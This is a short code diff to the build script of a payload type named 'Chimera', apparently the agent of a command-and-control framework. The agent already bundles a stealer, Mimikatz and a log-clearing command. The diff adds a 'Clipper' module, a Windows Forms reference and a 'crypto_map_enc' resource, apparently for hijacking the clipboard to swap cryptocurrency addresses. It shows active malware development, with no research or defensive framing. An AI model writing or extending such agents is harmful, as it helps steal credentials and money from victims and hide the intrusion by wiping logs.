@@ -56,7 +56,7 @@ class Chimera(PayloadType):
 
             # Optional embedded resources — only bundled if the file exists in agent_code/
             res_flags = []
-            for res_name in ["stealer_enc", "mimikatz_enc"]:
+            for res_name in ["stealer_enc", "mimikatz_enc", "crypto_map_enc"]:
                 res_path = f"{build_dir}/{res_name}"
                 if os.path.exists(res_path):
                     res_flags.append(f"/res:{res_path},{res_name}")
@@ -70,6 +70,7 @@ class Chimera(PayloadType):
                 "-r:System.Drawing.dll",
                 "-r:System.Management.dll",
                 "-r:System.ServiceProcess.dll",
+                "-r:System.Windows.Forms.dll",
                 f"{build_dir}/Program.cs",
                 f"{build_dir}/Config.cs",
                 f"{build_dir}/C2Http.cs",
@@ -93,6 +94,7 @@ class Chimera(PayloadType):
                 f"{build_dir}/Commands/Ps.cs",
                 f"{build_dir}/Commands/Mimikatz.cs",
                 f"{build_dir}/Commands/ClearLogs.cs",
+                f"{build_dir}/Commands/Clipper.cs",
             ] + res_flags
 
             result = subprocess.run(
